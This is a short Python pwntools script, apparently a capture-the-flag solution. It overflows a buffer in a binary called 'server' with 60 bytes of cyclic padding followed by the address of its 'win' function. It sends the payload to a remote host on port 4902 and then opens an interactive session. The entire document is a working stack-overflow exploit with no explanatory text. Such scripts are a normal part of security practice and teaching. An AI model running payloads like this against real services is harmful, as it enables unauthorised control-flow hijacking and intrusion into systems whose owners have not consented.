#!/usr/bin/python3

from pwn import *

elf = ELF('server')

#io = process('./server')

io = remote('thekidofarcrania.com' ,4902)

#ret = 0x0000000000401016
payload = cyclic(60) + p32(elf.sym.win)   #info address win 

io.sendline(payload)

io.interactive()
